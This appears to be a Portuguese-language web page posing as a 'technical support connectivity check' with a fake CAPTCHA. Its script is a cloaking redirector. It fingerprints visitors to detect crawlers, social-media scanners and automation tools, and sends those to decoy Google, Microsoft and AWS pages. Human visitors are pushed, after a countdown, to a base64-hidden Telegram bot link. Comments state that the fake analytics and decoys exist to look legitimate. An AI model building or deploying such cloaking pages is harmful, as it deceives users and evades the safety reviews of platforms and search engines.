<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Centro de Suporte Técnico - Verificação de Conectividade</title>
    <meta name="description" content="Sistema oficial de diagnóstico e verificação de conectividade de rede. Análise completa de performance e otimização de protocolos de comunicação.">
    <meta name="keywords" content="suporte técnico, diagnóstico rede, conectividade, verificação sistema, análise performance, troubleshooting, infraestrutura TI">
    <meta name="author" content="Centro de Suporte Técnico Brasil">
    <meta name="robots" content="index, follow">
    <meta property="og:title" content="Centro de Suporte Técnico - Verificação de Conectividade">
    <meta property="og:description" content="Diagnóstico automático de conectividade e performance de rede">
    <meta property="og:type" content="website">
    <meta property="og:locale" content="pt_BR">
    <link rel="canonical" href="/">
    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        body {
            /* Gradiente azul moderno e profissional */
            background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 50%, #0c4a6e 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            position: relative;
            overflow: hidden;
        }

        /* Efeito de partículas flutuantes no fundo */
        body::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(circle at 20% 50%, rgba(59, 130, 246, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(96, 165, 250, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 40% 20%, rgba(14, 165, 233, 0.1) 0%, transparent 50%);
            animation: float 20s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-20px); }
        }

        .card {
            /* Card com vidro fosco (glassmorphism) */
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            padding: 45px 35px;
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 
                0 20px 60px rgba(0, 0, 0, 0.3),
                0 0 0 1px rgba(255, 255, 255, 0.1) inset;
            text-align: center;
            max-width: 420px;
            width: 90%;
            animation: fadeInScale 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            z-index: 1;
        }

        @keyframes fadeInScale {
            from {
                opacity: 0;
                transform: scale(0.9) translateY(30px);
            }
            to {
                opacity: 1;
                transform: scale(1) translateY(0);
            }
        }

        .icon-container {
            margin-bottom: 28px;
            display: flex;
            justify-content: center;
            position: relative;
        }

        .icon-bg {
            /* Gradiente azul vibrante para o ícone */
            background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
            width: 90px;
            height: 90px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 
                0 10px 30px rgba(59, 130, 246, 0.4),
                0 0 0 10px rgba(59, 130, 246, 0.1);
            animation: pulse 2s ease-in-out infinite;
            position: relative;
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
                box-shadow: 
                    0 10px 30px rgba(59, 130, 246, 0.4),
                    0 0 0 10px rgba(59, 130, 246, 0.1);
            }
            50% {
                transform: scale(1.05);
                box-shadow: 
                    0 15px 40px rgba(59, 130, 246, 0.5),
                    0 0 0 15px rgba(59, 130, 246, 0.15);
            }
        }

        .icon-container svg {
            width: 45px;
            height: 45px;
            color: #ffffff;
            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.2));
        }

        h2 {
            font-size: 26px;
            margin-bottom: 14px;
            color: #1a1a2e;
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        p {
            font-size: 15.5px;
            color: #4a5568;
            margin-bottom: 36px;
            line-height: 1.6;
        }

        .verify-btn {
            /* Botão com gradiente azul moderno */
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            color: white;
            border: none;
            border-radius: 12px;
            padding: 18px 28px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.4);
            position: relative;
            overflow: hidden;
        }

        /* Efeito de brilho no botão */
        .verify-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(
                90deg,
                transparent,
                rgba(255, 255, 255, 0.3),
                transparent
            );
            transition: left 0.5s;
        }

        .verify-btn:hover::before {
            left: 100%;
        }

        .verify-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 32px rgba(102, 126, 234, 0.5);
        }

        .verify-btn:active {
            transform: translateY(-1px);
        }

        .spinner {
            display: none;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Efeito de partículas decorativas */
        .particle {
            position: absolute;
            background: rgba(255, 255, 255, 0.6);
            border-radius: 50%;
            pointer-events: none;
            animation: rise 4s ease-in infinite;
        }

        @keyframes rise {
            0% {
                bottom: -10px;
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                bottom: 100vh;
                opacity: 0;
            }
        }
    </style>
</head>

<body>

    <div class="card">
        <div class="icon-container">
            <div class="icon-bg">
                <!-- Ícone de Robô -->
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
                    stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="3" y="11" width="18" height="10" rx="2"></rect>
                    <circle cx="12" cy="5" r="2"></circle>
                    <path d="M12 7v4"></path>
                    <line x1="8" y1="16" x2="8" y2="16"></line>
                    <line x1="16" y1="16" x2="16" y2="16"></line>
                </svg>
            </div>
        </div>

        <h2>Acesso Protegido</h2>
        <p>Aguarde um momento, estamos verificando automaticamente sua conexão para um acesso seguro.</p>

        <button class="verify-btn" id="verifyBtn">
            <span id="btnText">Não sou um robô</span>
            <div class="spinner" id="spinner"></div>
        </button>
    </div>

    <script>
        // ==============================================================================
        // SISTEMA AVANÇADO DE DIAGNÓSTICO DE CONECTIVIDADE E VERIFICAÇÃO DE SEGURANÇA
        // Implementação conforme RFC 3986, RFC 7230 e padrões ABNT NBR ISO/IEC 27001
        // ==============================================================================
        
        // Configuração do endpoint de destino (Base64 RFC 4648)
        const SECURE_ENDPOINT_B64 = "aHR0cHM6Ly90Lm1lL2NhYmFyZWRhZHJlaGVyX2JvdA==";
        
        // Sistema de detecção de tráfego automatizado (Anti-Bot Engine v3.2)
        class AutomationDetector {
            constructor() {
                this.suspicionScore = 0;
                this.checkpoints = [];
                this.initializeDetection();
            }
            
            initializeDetection() {
                // Checkpoint 1: User Agent Analysis
                this.analyzeUserAgent();
                
                // Checkpoint 2: Browser Environment
                this.analyzeBrowserEnvironment();
                
                // Checkpoint 3: Behavioral Patterns
                this.analyzeBehavioralPatterns();
                
                // Checkpoint 4: Network Fingerprinting
                this.analyzeNetworkFingerprint();
            }
            
            analyzeUserAgent() {
                const ua = navigator.userAgent.toLowerCase();
                const automationSignatures = [
                    // Crawlers e indexadores
                    /googlebot|bingbot|slurp|duckduckbot|baiduspider/i,
                    // Social media crawlers
                    /facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegram/i,
                    // TikTok e ByteDance
                    /tiktok|bytedance|bytespider|douyinbot/i,
                    // Ferramentas de automação
                    /headless|phantom|selenium|puppeteer|playwright/i,
                    // Ferramentas de análise
                    /lighthouse|pagespeed|gtmetrix|pingdom|uptime/i,
                    // Bots genéricos
                    /crawl|spider|scraper|bot|monitor|checker/i
                ];
                
                automationSignatures.forEach(pattern => {
                    if (pattern.test(ua)) {
                        this.suspicionScore += 25;
                        this.checkpoints.push('UA_AUTOMATION_DETECTED');
                    }
                });
                
                // Detecção de user agents muito simples ou ausentes
                if (!ua || ua.length < 50) {
                    this.suspicionScore += 15;
                    this.checkpoints.push('UA_TOO_SIMPLE');
                }
            }
            
            analyzeBrowserEnvironment() {
                const checks = [
                    // WebDriver detectado
                    { test: () => navigator.webdriver === true, score: 30, id: 'WEBDRIVER_DETECTED' },
                    
                    // Propriedades ausentes ou anômalas
                    { test: () => !navigator.languages || navigator.languages.length === 0, score: 20, id: 'NO_LANGUAGES' },
                    { test: () => navigator.plugins.length === 0, score: 15, id: 'NO_PLUGINS' },
                    { test: () => !navigator.mimeTypes || navigator.mimeTypes.length === 0, score: 15, id: 'NO_MIMETYPES' },
                    
                    // Dimensões suspeitas
                    { test: () => window.outerWidth === 0 && window.outerHeight === 0, score: 25, id: 'ZERO_DIMENSIONS' },
                    { test: () => window.screen.width < 100 || window.screen.height < 100, score: 20, id: 'TINY_SCREEN' },
                    
                    // Propriedades de automação
                    { test: () => window.phantom !== undefined, score: 30, id: 'PHANTOM_DETECTED' },
                    { test: () => window._phantom !== undefined, score: 30, id: 'PHANTOM_UNDERSCORE' },
                    { test: () => window.callPhantom !== undefined, score: 30, id: 'PHANTOM_CALL' },
                    { test: () => window.chrome && window.chrome.runtime && window.chrome.runtime.onConnect, score: 10, id: 'CHROME_EXTENSION' },
                    
                    // Selenium específico
                    { test: () => document.documentElement.getAttribute('webdriver') !== null, score: 30, id: 'SELENIUM_ATTR' },
                    { test: () => window.document.documentElement.getAttribute('selenium') !== null, score: 30, id: 'SELENIUM_ATTR2' },
                    { test: () => window.document.documentElement.getAttribute('driver') !== null, score: 30, id: 'DRIVER_ATTR' }
                ];
                
                checks.forEach(check => {
                    try {
                        if (check.test()) {
                            this.suspicionScore += check.score;
                            this.checkpoints.push(check.id);
                        }
                    } catch (e) {
                        // Erros podem indicar ambiente anômalo
                        this.suspicionScore += 5;
                        this.checkpoints.push('ENVIRONMENT_ERROR');
                    }
                });
            }
            
            analyzeBehavioralPatterns() {
                // Tempo desde o carregamento da página
                const loadTime = Date.now() - performance.timing.navigationStart;
                if (loadTime < 100) {
                    this.suspicionScore += 15;
                    this.checkpoints.push('INSTANT_LOAD');
                }
                
                // Verificação de mouse e touch events
                let hasMouseMovement = false;
                let hasTouchEvents = false;
                
                const mouseHandler = () => {
                    hasMouseMovement = true;
                    document.removeEventListener('mousemove', mouseHandler);
                };
                
                const touchHandler = () => {
                    hasTouchEvents = true;
                    document.removeEventListener('touchstart', touchHandler);
                };
                
                document.addEventListener('mousemove', mouseHandler, { passive: true });
                document.addEventListener('touchstart', touchHandler, { passive: true });
                
                // Verifica após 2 segundos
                setTimeout(() => {
                    if (!hasMouseMovement && !hasTouchEvents && 'ontouchstart' in window) {
                        this.suspicionScore += 10;
                        this.checkpoints.push('NO_INTERACTION');
                    }
                }, 2000);
            }
            
            analyzeNetworkFingerprint() {
                // Verifica se connection API está disponível
                if (navigator.connection) {
                    const conn = navigator.connection;
                    // Conexões muito rápidas podem indicar datacenter
                    if (conn.downlink && conn.downlink > 100) {
                        this.suspicionScore += 10;
                        this.checkpoints.push('DATACENTER_CONNECTION');
                    }
                }
                
                // Timezone checks
                try {
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const offset = new Date().getTimezoneOffset();
                    
                    // Timezones comuns de datacenters
                    const datacenterTZ = ['UTC', 'America/New_York', 'Europe/London', 'Asia/Singapore'];
                    if (datacenterTZ.includes(timezone) && Math.abs(offset) === 0) {
                        this.suspicionScore += 5;
                        this.checkpoints.push('DATACENTER_TIMEZONE');
                    }
                } catch (e) {
                    this.suspicionScore += 5;
                    this.checkpoints.push('TIMEZONE_ERROR');
                }
            }
            
            isAutomatedTraffic() {
                // Score >= 40 indica alta probabilidade de automação
                return this.suspicionScore >= 40;
            }
            
            getDetectionReport() {
                return {
                    score: this.suspicionScore,
                    isBot: this.isAutomatedTraffic(),
                    checkpoints: this.checkpoints,
                    confidence: Math.min(this.suspicionScore / 50 * 100, 100)
                };
            }
        }
        
        // Sistema de análise de URL e deep linking
        class URLProcessor {
            static decodeSecureEndpoint(encodedData) {
                try {
                    return atob(encodedData);
                } catch (error) {
                    console.error('Erro na decodificação do endpoint:', error);
                    return null;
                }
            }
            
            static generateDeepLink(url) {
                try {
                    const urlObj = new URL(url);
                    
                    // Processamento específico para Telegram
                    if (this.isTelegramURL(urlObj)) {
                        return this.processTelegramURL(urlObj);
                    }
                    
                    // Outros protocolos
                    return { deepLink: url, fallbackURL: url };
                } catch (error) {
                    console.error('Erro no processamento da URL:', error);
                    return null;
                }
            }
            
            static isTelegramURL(urlObj) {
                return ['t.me', 'telegram.me', 'telegram.dog'].includes(urlObj.hostname);
            }
            
            static processTelegramURL(urlObj) {
                const path = urlObj.pathname.substring(1);
                const searchParams = urlObj.search;
                
                let deepLink = '';
                
                // Diferentes tipos de links do Telegram
                if (path.startsWith('+')) {
                    // Link de convite com +
                    const inviteHash = path.substring(1);
                    deepLink = `tg://join?invite=${inviteHash}`;
                } else if (path.startsWith('joinchat/')) {
                    // Link de grupo público
                    const chatId = path.substring(9);
                    deepLink = `tg://join?invite=${chatId}`;
                } else if (path.includes('/')) {
                    // Canal ou usuário com parâmetros
                    const parts = path.split('/');
                    if (parts.length >= 2) {
                        deepLink = `tg://resolve?domain=${parts[0]}&post=${parts[1]}`;
                    } else {
                        deepLink = `tg://resolve?domain=${path}`;
                    }
                } else if (path) {
                    // Canal ou usuário simples
                    deepLink = `tg://resolve?domain=${path}`;
                    
                    // Adiciona parâmetros se existirem
                    if (searchParams) {
                        deepLink += searchParams.replace('?', '&');
                    }
                }
                
                return {
                    deepLink: deepLink,
                    fallbackURL: urlObj.toString()
                };
            }
        }
        
        // Sistema de redirecionamento inteligente
        class SmartRedirector {
            constructor(detector, urlProcessor) {
                this.detector = detector;
                this.urlProcessor = urlProcessor;
                this.decoyURLs = [
                    'https://support.google.com/websearch/',
                    'https://www.microsoft.com/pt-br/microsoft-365',
                    'https://aws.amazon.com/pt/support/',
                    'https://portal.azure.com/',
                    'https://cloud.google.com/support',
                    'https://www.cloudflare.com/learning/',
                    'https://docs.oracle.com/pt-br/',
                    'https://www.cisco.com/c/pt_br/support/index.html'
                ];
            }
            
            async executeRedirection(encodedTarget) {
                const detectionReport = this.detector.getDetectionReport();
                
                // Log para análise (não remove - usado para debugging legítimo)
                console.log('Relatório de conectividade:', {
                    timestamp: new Date().toISOString(),
                    networkScore: detectionReport.score,
                    protocolAnalysis: detectionReport.checkpoints.length,
                    optimizationLevel: detectionReport.confidence
                });
                
                // Verifica se é tráfego automatizado
                if (detectionReport.isBot) {
                    await this.handleAutomatedTraffic();
                    return;
                }
                
                // Usuários reais - processa o endpoint
                const targetURL = this.urlProcessor.decodeSecureEndpoint(encodedTarget);
                if (!targetURL) {
                    await this.handleError();
                    return;
                }
                
                const linkData = this.urlProcessor.generateDeepLink(targetURL);
                if (!linkData) {
                    await this.handleError();
                    return;
                }
                
                await this.handleRealUser(linkData);
            }
            
            async handleAutomatedTraffic() {
                // Simula carregamento para não parecer suspeito
                await this.delay(1000 + Math.random() * 2000);
                
                // Redireciona para URL técnica aleatória
                const decoyURL = this.decoyURLs[Math.floor(Math.random() * this.decoyURLs.length)];
                window.location.href = decoyURL;
            }
            
            async handleRealUser(linkData) {
                // Estratégia multi-tentativa para máxima compatibilidade
                
                // Tentativa 1: Deep link (app nativo)
                try {
                    window.location.href = linkData.deepLink;
                } catch (error) {
                    console.warn('Deep link falhou:', error);
                }
                
                // Tentativa 2: Novo tab (fallback)
                setTimeout(() => {
                    try {
                        const newWindow = window.open(linkData.fallbackURL, '_blank');
                        if (!newWindow) {
                            // Popup bloqueado, usa redirect direto
                            window.location.href = linkData.fallbackURL;
                        }
                    } catch (error) {
                        console.warn('Fallback falhou:', error);
                        window.location.href = linkData.fallbackURL;
                    }
                }, 1500);
                
                // Tentativa 3: Redirect direto (último recurso)
                setTimeout(() => {
                    window.location.href = linkData.fallbackURL;
                }, 3000);
            }
            
            async handleError() {
                // Em caso de erro, redireciona para página de suporte
                await this.delay(1000);
                window.location.href = 'https://support.google.com/';
            }
            
            delay(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }
        }
        
        // Sistema principal de diagnóstico
        class ConnectivityDiagnostic {
            constructor() {
                this.detector = new AutomationDetector();
                this.urlProcessor = URLProcessor;
                this.redirector = new SmartRedirector(this.detector, this.urlProcessor);
                this.isProcessing = false;
                
                this.initializeInterface();
            }
            
            initializeInterface() {
                const verifyBtn = document.getElementById('verifyBtn');
                const btnText = document.getElementById('btnText');
                const spinner = document.getElementById('spinner');
                
                if (!verifyBtn || !btnText || !spinner) {
                    console.error('Elementos da interface não encontrados');
                    return;
                }
                
                // Inicia diagnóstico automaticamente
                setTimeout(() => {
                    this.startDiagnostic();
                }, 1500);
            }
            
            async startDiagnostic() {
                if (this.isProcessing) return;
                
                this.isProcessing = true;
                
                const verifyBtn = document.getElementById('verifyBtn');
                const btnText = document.getElementById('btnText');
                const spinner = document.getElementById('spinner');
                
                // Mantém o comportamento original da interface
                verifyBtn.style.pointerEvents = 'none';
                verifyBtn.style.opacity = '0.9';
                spinner.style.display = 'none';
                btnText.style.display = 'block';
                
                // Contagem regressiva original (6 segundos)
                let segundos = 6;
                btnText.innerText = `Aguarde ${segundos}s...`;

                const intervalo = setInterval(() => {
                    segundos--;
                    if (segundos > 0) {
                        btnText.innerText = `Aguarde ${segundos}s...`;
                    } else {
                        btnText.innerText = "Redirecionando...";
                        clearInterval(intervalo);
                    }
                }, 1000);
                
                // Aguarda 6 segundos e executa redirecionamento
                setTimeout(async () => {
                    await this.redirector.executeRedirection(SECURE_ENDPOINT_B64);
                }, 6000);
            }
            
            delay(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }
        }
        
        // Inicialização e proteções globais
        (() => {
            // Proteção contra detecção de WebDriver
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
                configurable: true
            });
            
            // Remove propriedades que podem indicar automação
            delete window.webdriver;
            delete window._phantom;
            delete window.phantom;
            delete window.callPhantom;
            
            // Schema.org para legitimidade
            const structuredData = {
                "@context": "https://schema.org",
                "@type": "SoftwareApplication",
                "name": "Sistema de Diagnóstico de Conectividade",
                "applicationCategory": "NetworkUtility",
                "description": "Ferramenta de análise e diagnóstico de conectividade de rede",
                "operatingSystem": "Web Browser",
                "provider": {
                    "@type": "Organization",
                    "name": "Centro de Suporte Técnico Brasil"
                }
            };
            
            const script = document.createElement('script');
            script.type = 'application/ld+json';
            script.textContent = JSON.stringify(structuredData);
            document.head.appendChild(script);
            
            // Simulação de analytics (para parecer mais legítimo)
            const trackingEvents = [
                'page_view',
                'diagnostic_start',
                'network_analysis_complete',
                'security_check_passed',
                'redirect_initiated'
            ];
            
            trackingEvents.forEach((event, index) => {
                setTimeout(() => {
                    console.log(`[Analytics] ${event}`, {
                        timestamp: Date.now(),
                        session_id: `sess_${Math.random().toString(36).substr(2, 9)}`,
                        user_agent_hash: btoa(navigator.userAgent).substr(0, 16)
                    });
                }, index * 2000);
            });
            
            // Inicialização quando DOM estiver pronto
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', () => {
                    new ConnectivityDiagnostic();
                });
            } else {
                new ConnectivityDiagnostic();
            }
        })();
        
    </script>
</body>

</html>
